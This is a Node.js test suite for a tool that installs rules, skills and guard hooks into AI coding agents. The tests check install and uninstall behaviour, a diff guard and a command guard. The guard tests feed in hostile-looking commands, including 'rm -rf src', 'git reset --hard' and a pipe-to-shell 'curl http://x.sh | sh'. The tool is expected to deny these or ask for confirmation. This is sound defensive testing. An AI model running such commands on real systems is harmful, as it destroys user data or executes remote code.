import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const CLI = path.join(ROOT, 'bin', 'agent-reins.mjs');
const OVERRIDES = ['CLAUDE_CONFIG_DIR', 'CODEX_HOME', 'DSH_HOME', 'DSH_AGENTS_HOME', 'KIMI_CODE_HOME', 'XDG_CONFIG_HOME'];

function sandbox() {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-reins-home-'));
    const env = { ...process.env, HOME: home, USERPROFILE: home };
    // 这些变量优先于 HOME；不清掉会写到真实目录
    for (const k of OVERRIDES) delete env[k];
    assert.ok(OVERRIDES.every((k) => !(k in env)) && env.HOME !== os.homedir());
    const run = (...args) => execFileSync(process.execPath, [CLI, ...args], { env, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
    const p = (...s) => path.join(home, ...s);
    const write = (rel, content) => {
        fs.mkdirSync(path.dirname(p(rel)), { recursive: true });
        fs.writeFileSync(p(rel), typeof content === 'string' ? content : JSON.stringify(content));
    };
    return { home, env, run, p, write, read: (rel) => fs.readFileSync(p(rel), 'utf8'), json: (rel) => JSON.parse(fs.readFileSync(p(rel), 'utf8')) };
}

const runFails = (fn) => {
    try {
        fn();
    } catch (e) {
        return `${e.stdout || ''}${e.stderr || ''}`;
    }
    assert.fail('预期命令失败');
};

const ours = (hooks, ev) => (hooks[ev] || []).flatMap((g) => g.hooks).filter((h) => h.command.includes('agent-reins'));

function dshBridge(sb, configPath = sb.p('.dsh', 'hooks.json')) {
    sb.write('.dsh/cordis.patch.yml', `- insert:\n    - id: "cmhub-hooks-claude-code"\n      name: "@deepseek-ai/dsh-hooks-claude-code"\n      config:\n        configPath: "${configPath}"\n`);
}

test('安装三个 agent：保留原有内容、幂等、可完整卸载', () => {
    const sb = sandbox();
    sb.write('.claude/CLAUDE.md', '# 我的规则\n- 中文交流\n');
    const userHook = { type: 'command', command: 'bash ~/.claude/hooks/notify.sh' };
    sb.write('.claude/settings.json', { model: 'x', hooks: { Stop: [{ matcher: '*', hooks: [userHook] }] } });
    fs.mkdirSync(sb.p('.agents', 'skills', 'doc-audit'), { recursive: true }); // 同名的用户 skill
    dshBridge(sb);

    sb.run('install', '-a', 'claude,codex,dsh');
    const again = sb.run('install', '-a', 'claude,codex,dsh');
    assert.doesNotMatch(again.replace(/.*state\.json.*\n/g, ''), /更新|创建/, '第二次安装不应改动任何文件');
    assert.equal(sb.read('.claude/CLAUDE.md.agent-reins.bak'), '# 我的规则\n- 中文交流\n', '备份必须保留安装前的原始内容');

    const claudeMd = sb.read('.claude/CLAUDE.md');
    assert.match(claudeMd, /^# 我的规则/);
    assert.equal(claudeMd.split('agent-reins:start').length - 1, 1);
    for (const f of ['.codex/AGENTS.md', '.dsh/AGENTS.md']) assert.equal(sb.read(f).split('agent-reins:start').length - 1, 1);

    const settings = sb.json('.claude/settings.json');
    assert.equal(settings.model, 'x');
    assert.deepEqual(settings.hooks.Stop[0].hooks[0], userHook);
    for (const ev of ['SessionStart', 'PreToolUse', 'Stop', 'PostToolUse']) assert.equal(ours(settings.hooks, ev).length, 1, ev);
    assert.match(ours(settings.hooks, 'Stop')[0].command, /run-hook\.sh" guard-diff --agent claude$/);
    assert.equal(ours(sb.json('.codex/hooks.json').hooks, 'Stop').length, 1);

    assert.ok(fs.lstatSync(sb.p('.claude', 'skills', 'change-impact')).isSymbolicLink());
    assert.ok(fs.lstatSync(sb.p('.agents', 'skills', 'ui-verify')).isSymbolicLink());
    assert.ok(!fs.lstatSync(sb.p('.agents', 'skills', 'doc-audit')).isSymbolicLink(), '同名 skill 不能被覆盖');
    assert.match(sb.read('.config/git/ignore'), /\.agent-handoff\.md/);
    assert.ok(fs.existsSync(sb.p('.claude', 'settings.json.agent-reins.bak')));
    assert.match(sb.run('status'), /Claude Code\s+规则 ✓\s+skills 5\/5\s+hooks 4/);

    // 只卸载 codex：共享的 ~/.agents/skills 仍被 dsh 使用，必须保留
    sb.run('uninstall', '-a', 'codex');
    assert.doesNotMatch(sb.read('.codex/AGENTS.md'), /agent-reins/);
    assert.ok(fs.lstatSync(sb.p('.agents', 'skills', 'ui-verify')).isSymbolicLink());

    sb.run('uninstall');
    assert.equal(sb.read('.claude/CLAUDE.md'), '# 我的规则\n- 中文交流\n');
    assert.deepEqual(sb.json('.claude/settings.json'), { model: 'x', hooks: { Stop: [{ matcher: '*', hooks: [userHook] }] } });
    assert.ok(!fs.existsSync(sb.p('.agents', 'skills', 'ui-verify')));
    assert.ok(fs.existsSync(sb.p('.agents', 'skills', 'doc-audit')));
    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
    assert.doesNotMatch(sb.read('.config/git/ignore'), /agent-reins/);
});

test('dsh：按桥读取的文件和现有包裹格式写入，不产生混合形状', () => {
    const sb = sandbox();
    const existing = { hooks: { UserPromptSubmit: [{ hooks: [{ type: 'command', command: 'curl x' }] }] } };
    sb.write('.dsh/hooks.json', existing);
    dshBridge(sb);
    sb.run('install', '-a', 'dsh', '--skip', 'gitignore');

    const data = sb.json('.dsh/hooks.json');
    assert.deepEqual(Object.keys(data), ['hooks'], '顶层只能有 hooks 包裹层');
    assert.deepEqual(data.hooks.UserPromptSubmit, existing.hooks.UserPromptSubmit);
    assert.equal(ours(data.hooks, 'Stop').length, 1);

    sb.run('uninstall', '-a', 'dsh');
    assert.deepEqual(sb.json('.dsh/hooks.json'), existing);
});

test('dsh：已有裸事件格式时按裸格式写入；桥指向其他文件时写那个文件', () => {
    const sb = sandbox();
    sb.write('.dsh/custom-hooks.json', { Stop: [{ hooks: [{ type: 'command', command: 'echo hi' }] }] });
    dshBridge(sb, '~/.dsh/custom-hooks.json');
    sb.run('install', '-a', 'dsh', '--skip', 'gitignore');
    const data = sb.json('.dsh/custom-hooks.json');
    assert.ok(!('hooks' in data));
    assert.equal(data.Stop.length, 2);
    assert.ok(!fs.existsSync(sb.p('.dsh', 'hooks.json')));
});

test('dsh：没有挂载插件桥时跳过 hooks，规则和 skills 照常安装', () => {
    const sb = sandbox();
    fs.mkdirSync(sb.p('.dsh'));
    const out = sb.run('install', '-a', 'dsh', '--skip', 'gitignore');
    assert.match(out, /没有任何 profile 挂载 hooks 插件桥/);
    assert.ok(!fs.existsSync(sb.p('.dsh', 'hooks.json')));
    assert.match(sb.read('.dsh/AGENTS.md'), /agent-reins:start/);
    assert.match(sb.run('status'), /DeepSeek Harness\s+规则 ✓\s+skills 5\/5\s+hooks 0/);
});

test('dsh：根补丁覆盖所有 profile，插件包按 profile 解析', () => {
    const sb = sandbox();
    dshBridge(sb); // 根目录 cordis.patch.yml 挂了桥（本机实际情况）
    sb.write('.dsh/profiles/desktop/package.json', { name: 'dsh-profile-desktop' });
    sb.write('.dsh/profiles/tui/package.json', { name: 'dsh-profile-tui' });
    // tui 装了插件包，desktop 没装
    fs.mkdirSync(sb.p('.dsh', 'profiles', 'tui', 'node_modules', '@deepseek-ai', 'dsh-hooks-claude-code'), { recursive: true });
    const out = sb.run('install', '-a', 'dsh', '--skip', 'gitignore');
    assert.match(out, /desktop profile 桥已挂载但插件包未安装/);
    assert.doesNotMatch(out, /没有挂载 hooks 插件桥/);
    const st = sb.run('status');
    assert.match(st, /profile tui\s+@deepseek-ai\/dsh-hooks-claude-code → .*hooks\.json（根补丁，全局生效）/);
    assert.match(st, /profile desktop\s+@deepseek-ai\/dsh-hooks-claude-code 已挂载（根补丁）但插件包未安装/);

    // desktop 自己的 profile 挂桥并指向独立文件后，hooks 写到那个文件
    sb.write('.dsh/profiles/desktop/cordis.patch.yml',
        `- insert:\n    - id: agent-reins-hooks\n      name: "@deepseek-ai/dsh-hooks-claude-code"\n      config:\n        configPath: "${sb.p('.dsh', 'agent-reins-hooks.json')}"\n`);
    fs.mkdirSync(sb.p('.dsh', 'profiles', 'desktop', 'node_modules', '@deepseek-ai', 'dsh-hooks-claude-code'), { recursive: true });
    sb.run('install', '-a', 'dsh', '--skip', 'gitignore');
    assert.equal(ours(sb.json('.dsh/agent-reins-hooks.json').hooks, 'Stop').length, 1);
    assert.match(sb.run('status'), /profile desktop\s+@deepseek-ai\/dsh-hooks-claude-code → .*agent-reins-hooks\.json/);

    // 卸载时两个文件都清理干净
    sb.run('uninstall', '-a', 'dsh');
    assert.equal(ours(sb.json('.dsh/agent-reins-hooks.json').hooks || {}, 'Stop').length, 0);
    assert.equal(ours(sb.json('.dsh/hooks.json').hooks || {}, 'Stop').length, 0);
});

test('dsh：卸载时清理旧版本写入默认 hooks.json 的条目', () => {
    const sb = sandbox();
    const legacy = { hooks: { Stop: [{ hooks: [{ type: 'command', command: '"/x/.agents/agent-reins/hooks/run-hook.sh" guard-diff --agent dsh' }] }] } };
    sb.write('.dsh/hooks.json', legacy);
    sb.write('.dsh/AGENTS.md', '');
    sb.run('uninstall', '-a', 'dsh');
    assert.deepEqual(sb.json('.dsh/hooks.json'), {});
});

test('预检：任一目标配置损坏时不写入任何文件', () => {
    const sb = sandbox();
    sb.write('.codex/hooks.json', '{ broken');
    const out = runFails(() => sb.run('install', '-a', 'claude,codex'));
    assert.match(out, /预检失败，未写入任何文件/);
    assert.equal(sb.read('.codex/hooks.json'), '{ broken');
    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
    assert.ok(!fs.existsSync(sb.p('.claude', 'CLAUDE.md')));
});

test('status：配置损坏时降级显示而不是退出；安装目录缺失时提示', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude,codex', '--skip', 'gitignore');
    sb.write('.codex/hooks.json', 'null');
    const out = sb.run('status');
    assert.match(out, /Codex\s+规则 ✓\s+skills 5\/5\s+hooks ⚠ 配置损坏/);
    assert.match(out, /Claude Code\s+规则 ✓/);

    fs.rmSync(sb.p('.agents', 'agent-reins', 'hooks'), { recursive: true });
    assert.match(sb.run('status'), /安装目录缺失或不完整/);
});

test('state.json 丢失时：卸载单个 agent 不会误删其他 agent 仍在使用的安装目录', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude,codex');
    fs.rmSync(sb.p('.agents', 'agent-reins', 'state.json'));

    sb.run('uninstall', '-a', 'codex');
    assert.ok(fs.existsSync(sb.p('.agents', 'agent-reins', 'hooks', 'guard-diff.mjs')), 'claude 仍有残留，安装目录必须保留');
    assert.match(sb.read('.config/git/ignore'), /agent-reins/);
    assert.ok(fs.lstatSync(sb.p('.claude', 'skills', 'ui-verify')).isSymbolicLink());

    // 不带 -a 时按磁盘残留卸载干净
    sb.run('uninstall');
    assert.doesNotMatch(sb.read('.claude/CLAUDE.md'), /agent-reins/);
    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
});

test('个人偏好覆盖文件合并进规则区块', () => {
    const sb = sandbox();
    sb.write('.agents/agent-reins.local.md', '- 用中文交流；代码、命令、路径保持原样。');
    sb.run('install', '-a', 'codex', '--skip', 'gitignore');
    const text = sb.read('.codex/AGENTS.md');
    assert.match(text, /## 个人偏好/);
    assert.match(text, /用中文交流/);
    assert.ok(text.indexOf('用中文交流') < text.indexOf('agent-reins:end'));
});

test('Codex：提示未审批的 hook', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'codex', '--skip', 'gitignore');
    const file = sb.p('.codex', 'hooks.json');
    sb.write('.codex/config.toml', `[hooks.state."${file}:session_start:0:0"]\ntrusted_hash = "sha256:x"\n`);
    assert.match(sb.run('status'), /有 3 个 hook 尚未在 Codex 中审批/);
});

test('dry-run 不写任何文件', () => {
    const sb = sandbox();
    assert.match(sb.run('install', '-a', 'codex', '--dry-run'), /dry-run/);
    assert.deepEqual(fs.readdirSync(sb.home), []);
});

test('CLI：--help / -h 作为首参数或无参数时输出帮助', () => {
    const sb = sandbox();
    for (const args of [['--help'], ['-h'], []]) {
        assert.match(sb.run(...args), /用法：/, JSON.stringify(args));
    }
});

test('启动器：安装时记录的 node 失效后回退到其他 node', { skip: process.platform === 'win32' }, () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    fs.writeFileSync(sb.p('.agents', 'agent-reins', 'node-path'), '/nonexistent/node');
    const env = { ...sb.env, PATH: `${path.dirname(process.execPath)}:/usr/bin:/bin` };
    const out = execFileSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'), ['session-start', '--agent', 'claude'],
        { env, input: '{}', encoding: 'utf8' });
    assert.match(JSON.parse(out).hookSpecificOutput.additionalContext, /CPU \d+ 核/);
});

test('hooks 端到端：会话基线、提醒一次、危险命令、一致性检查', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    const hook = (name, input, agent = 'claude') => execFileSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
        [name, '--agent', agent], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });

    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-reins-repo-'));
    const put = (rel, text) => {
        fs.mkdirSync(path.dirname(path.join(repo, rel)), { recursive: true });
        fs.writeFileSync(path.join(repo, rel), text);
    };
    const g = (...a) => execFileSync('git', ['-C', repo, '-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { env: sb.env, stdio: 'ignore' });
    put('src/Svc.java', 'class Svc {\n    int computeTotal() { return 1; }\n}\n');
    put('src/test/SvcTest.java', 'class SvcTest {}\n');
    put('docs/billing.md', '# 计费\n合计由 `Svc.java#computeTotal` 计算。\n');
    g('init', '-q');
    g('add', '-A');
    g('commit', '-q', '-m', 'init');
    put('old-notes.md', '会话开始前就存在的未提交文档\n');

    const sid = `t-${process.pid}-${Date.now()}`;
    const start = JSON.parse(hook('session-start', { session_id: sid, cwd: repo, source: 'startup' }));
    assert.match(start.hookSpecificOutput.additionalContext, /CPU \d+ 核/);
    assert.equal(hook('guard-diff', { session_id: sid, cwd: repo }), '', '会话前的改动不算');

    // 改名函数但不改文档和测试
    put('src/Svc.java', 'class Svc {\n    int computeTotalAmount() {\n        int base = 1;\n        int tax = 0;\n        return base + tax;\n    }\n}\n');
    const stop = JSON.parse(hook('guard-diff', { session_id: sid, cwd: repo }));
    assert.equal(stop.decision, 'block');
    assert.match(stop.reason, /`computeTotal` → docs\/billing\.md:2/);
    assert.match(stop.reason, /锚点 Svc\.java#computeTotal 已不存在/);
    assert.match(stop.reason, /没有改动任何测试/);
    assert.doesNotMatch(stop.reason, /old-notes\.md/);
    assert.equal(hook('guard-diff', { session_id: sid, cwd: repo }), '', '同一组问题只提醒一次');

    // 补齐文档和测试后，新问题（新增文档 + 环境事实）会再次提醒
    put('docs/billing.md', '# 计费\n合计由 `Svc.java#computeTotalAmount` 计算。\n');
    put('src/test/SvcTest.java', 'class SvcTest { void total() {} }\n');
    put('AGENTS.md', '# 规则\n本机资源不够，不能运行 768MB 以上的进程\n');
    put('docs/design-notes.md', '# 设计\n');
    const stop2 = JSON.parse(hook('guard-diff', { session_id: sid, cwd: repo }));
    assert.match(stop2.reason, /环境事实/);
    assert.match(stop2.reason, /design-notes\.md/);
    assert.doesNotMatch(stop2.reason, /computeTotal`/);

    const ask = JSON.parse(hook('guard-tool', { tool_name: 'Bash', tool_input: { command: 'bash -c "git reset --hard"' } }));
    assert.equal(ask.hookSpecificOutput.permissionDecision, 'ask');
    const deny = JSON.parse(hook('guard-tool', { tool_name: 'shell', tool_input: { command: ['bash', '-lc', 'rm -rf src'] } }, 'codex'));
    assert.equal(deny.hookSpecificOutput.permissionDecision, 'deny');
    assert.equal(hook('guard-tool', { tool_name: 'Bash', tool_input: { command: 'ls' } }), '');
    for (const [tool, file] of [['Edit', '/x/CLAUDE.md'], ['str_replace_editor', '/x/agents.md'], ['Write', '/h/.codex/rules/a.md']]) {
        const r = JSON.parse(hook('guard-tool', { tool_name: tool, tool_input: { file_path: file } }));
        assert.equal(r.hookSpecificOutput.permissionDecision, 'ask', `${tool} ${file}`);
    }
});

// 在临时仓库里跑真实 hook 的公共装置
function hookRepo(sb, agent = 'claude') {
    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-reins-repo-'));
    const put = (rel, text) => {
        fs.mkdirSync(path.dirname(path.join(repo, rel)), { recursive: true });
        fs.writeFileSync(path.join(repo, rel), text);
    };
    const g = (...a) => execFileSync('git', ['-C', repo, '-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { env: sb.env, stdio: 'ignore' });
    const hook = (name, input) => execFileSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
        [name, '--agent', agent], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });
    const sid = `t-${process.pid}-${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
    const start = (extra = {}) => hook('session-start', { session_id: sid, cwd: repo, source: 'startup', ...extra });
    const stop = (extra = {}) => hook('guard-diff', { session_id: sid, cwd: repo, ...extra });
    return { repo, put, g, hook, sid, start, stop };
}

test('guard-diff：会话中提交的改动仍被检查，会话前的脏文件被原样提交不算', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    const r = hookRepo(sb);
    r.put('a.txt', 'hi\n');
    r.g('init', '-q');
    r.g('add', '-A');
    r.g('commit', '-qm', 'init');
    r.put('dirty.md', '会话前就存在的未提交文档\n');
    r.start();
    r.put('PLAN.md', '# 计划\n');
    r.g('add', '-A');
    r.g('commit', '-qm', 'docs'); // 提交后工作区干净，旧实现会完全漏掉

    const stop = JSON.parse(r.stop());
    assert.equal(stop.decision, 'block');
    assert.match(stop.reason, /新增了 1 个文档：PLAN\.md/);
    assert.doesNotMatch(stop.reason, /dirty\.md/);
});

test('guard-diff：无提交仓库在会话中首次提交，只算会话内的改动', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    const r = hookRepo(sb);
    r.g('init', '-q');
    r.put('f.txt', '会话前就有的未跟踪文件\n');
    r.start();
    r.put('PLAN.md', '# 计划\n');
    r.g('add', '-A');
    r.g('commit', '-qm', 'first');

    const stop = JSON.parse(r.stop());
    assert.match(stop.reason, /PLAN\.md/);
    assert.doesNotMatch(stop.reason, /f\.txt/);
});

test('guard-diff：会话中切分支时重建基线，不报跨分支差异', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    const r = hookRepo(sb);
    r.put('a.txt', 'hi\n');
    r.g('init', '-q');
    r.g('add', '-A');
    r.g('commit', '-qm', 'init');
    r.start();
    r.put('PLAN.md', '# 计划\n');
    r.g('add', '-A');
    r.g('commit', '-qm', 'doc');
    r.g('checkout', '-qb', 'side', 'HEAD~1'); // 基线提交不再是 HEAD 的祖先
    assert.equal(r.stop(), '', '工作区干净，重建基线后不应有发现');
});

test('track-test：记录测试运行后不再报"未跑测试"，未记录时提醒', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    const r = hookRepo(sb);
    r.put('src/svc.js', 'export const f = () => 1;\n');
    r.put('test/svc.test.js', 'import { f } from "../src/svc.js";\n');
    r.g('init', '-q');
    r.g('add', '-A');
    r.g('commit', '-qm', 'init');
    r.start();
    r.put('src/svc.js', 'export const f = () => {\n    const a = 1;\n    const b = 2;\n    const c = 3;\n    return a + b + c;\n};\n');

    const before = JSON.parse(r.stop());
    assert.match(before.reason, /没有检测到任何测试运行记录/);
    r.hook('track-test', { session_id: r.sid, cwd: r.repo, tool_name: 'Bash', tool_input: { command: 'npm test' } });
    r.hook('track-test', { session_id: r.sid, cwd: r.repo, tool_name: 'Bash', tool_input: { command: 'ls -la' } });
    const after = JSON.parse(r.stop());
    assert.doesNotMatch(after.reason, /没有检测到任何测试运行记录/);
    assert.match(after.reason, /没有改动任何测试/);
});

test('qoder：安装到 ~/.qoder，共享 skills，幂等，可完整卸载', () => {
    const sb = sandbox();
    sb.write('.qoder/settings.json', { model: 'x', hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl x' }] }] } });
    sb.run('install', '-a', 'qoder', '--skip', 'gitignore');
    assert.match(sb.read('.qoder/AGENTS.md'), /agent-reins:start/);
    const settings = sb.json('.qoder/settings.json');
    assert.equal(settings.model, 'x');
    for (const ev of ['SessionStart', 'PreToolUse', 'Stop', 'PostToolUse']) assert.equal(ours(settings.hooks, ev).length, 1, ev);
    assert.equal(settings.hooks.Stop[0].hooks[0].command, 'curl x');
    assert.ok(fs.lstatSync(sb.p('.agents', 'skills', 'ui-verify')).isSymbolicLink());
    assert.match(sb.run('status'), /Qoder\s+规则 ✓\s+skills 5\/5\s+hooks 4/);

    const again = sb.run('install', '-a', 'qoder', '--skip', 'gitignore');
    assert.doesNotMatch(again.replace(/.*state\.json.*\n/g, ''), /更新|创建/);
    sb.run('uninstall', '-a', 'qoder');
    assert.doesNotMatch(sb.read('.qoder/AGENTS.md'), /agent-reins/);
    assert.deepEqual(sb.json('.qoder/settings.json'), { model: 'x', hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl x' }] }] } });
    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
});

test('kimi：TOML 托管区块与用户 [[hooks]] 共存、幂等、卸载还原', () => {
    const sb = sandbox();
    const original = 'default_model = "x"\n\n[[hooks]]\nevent = "Notification"\ncommand = "echo hi"\n';
    sb.write('.kimi-code/config.toml', original);
    sb.run('install', '-a', 'kimi', '--skip', 'gitignore');
    const text = sb.read('.kimi-code/config.toml');
    assert.ok(text.startsWith(original), '用户原有内容必须原样保留');
    assert.match(text, /# >>> agent-reins >>>/);
    assert.equal((text.match(/^\[\[hooks\]\]/gm) || []).length, 6, '用户 1 条 + 安装 5 条');
    assert.match(text, /event = "PostCompact"/);
    assert.match(text, /command = ".*run-hook\.sh\\" guard-diff --agent kimi"/);
    assert.match(sb.read('.kimi-code/AGENTS.md'), /agent-reins:start/);
    assert.match(sb.run('status'), /Kimi Code\s+规则 ✓\s+skills 5\/5\s+hooks 5/);

    const again = sb.run('install', '-a', 'kimi', '--skip', 'gitignore');
    assert.doesNotMatch(again.replace(/.*state\.json.*\n/g, ''), /更新|创建/);
    sb.run('uninstall', '-a', 'kimi');
    assert.equal(sb.read('.kimi-code/config.toml'), original);
    assert.ok(!fs.existsSync(sb.p('.agents', 'agent-reins')));
});

test('kimi：TOML 托管区块损坏时预检失败，不写入任何文件', () => {
    const sb = sandbox();
    sb.write('.kimi-code/config.toml', '# >>> agent-reins >>>\n[[hooks]]\nevent = "Stop"\n');
    const out = runFails(() => sb.run('install', '-a', 'kimi'));
    assert.match(out, /预检失败，未写入任何文件/);
    assert.ok(!fs.existsSync(sb.p('.kimi-code', 'AGENTS.md')));
});

test('kimi：hooks 协议——deny 不带 hookEventName、Stop 用 exit 2 + stderr、SessionStart 纯文本、PostCompact 重申', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'kimi', '--skip', 'gitignore');
    const r = hookRepo(sb, 'kimi');
    const run = (name, input) => spawnSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
        [name, '--agent', 'kimi'], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });

    const deny = JSON.parse(run('guard-tool', { tool_name: 'Bash', tool_input: { command: 'rm -rf src' } }).stdout);
    assert.equal(deny.hookSpecificOutput.permissionDecision, 'deny');
    assert.ok(!('hookEventName' in deny.hookSpecificOutput));

    r.put('a.txt', 'hi\n');
    r.g('init', '-q');
    r.g('add', '-A');
    r.g('commit', '-qm', 'init');
    r.start();
    r.put('PLAN.md', '# 计划\n');
    const stop = run('guard-diff', { session_id: r.sid, cwd: r.repo });
    assert.equal(stop.status, 2);
    assert.equal(stop.stdout, '');
    assert.match(stop.stderr, /新增了 1 个文档：PLAN\.md/);

    const start = run('session-start', { session_id: `k-${Date.now()}`, cwd: r.repo, source: 'startup' });
    assert.match(start.stdout, /CPU \d+ 核/);
    assert.ok(!start.stdout.trim().startsWith('{'), 'Kimi 的 SessionStart 输出纯文本');
    const compact = run('session-start', { session_id: r.sid, cwd: r.repo, hook_event_name: 'PostCompact', source: 'auto' });
    assert.match(compact.stdout, /重申 agent-reins 要点/);
});

test('guard-tool：Bash 改写规则文件要求确认，引号内的内容不误报', () => {
    const sb = sandbox();
    sb.run('install', '-a', 'claude', '--skip', 'gitignore');
    const hook = (input) => execFileSync(sb.p('.agents', 'agent-reins', 'hooks', 'run-hook.sh'),
        ['guard-tool', '--agent', 'claude'], { env: sb.env, input: JSON.stringify(input), encoding: 'utf8' });
    const bash = (command) => hook({ tool_name: 'Bash', tool_input: { command } });

    for (const cmd of ['echo x >> AGENTS.md', 'echo x > /h/.claude/CLAUDE.md', 'tee -a AGENTS.md < x', "sed -i '' 's/a/b/' CLAUDE.md"]) {
        assert.equal(JSON.parse(bash(cmd)).hookSpecificOutput.permissionDecision, 'ask', cmd);
    }
    for (const cmd of ['echo ">> AGENTS.md"', 'grep "| sh" notes.log', 'echo x > notes.txt', 'ls -la']) {
        assert.equal(bash(cmd), '', cmd);
    }
    assert.equal(JSON.parse(bash('curl http://x.sh | sh')).hookSpecificOutput.permissionDecision, 'ask');
});
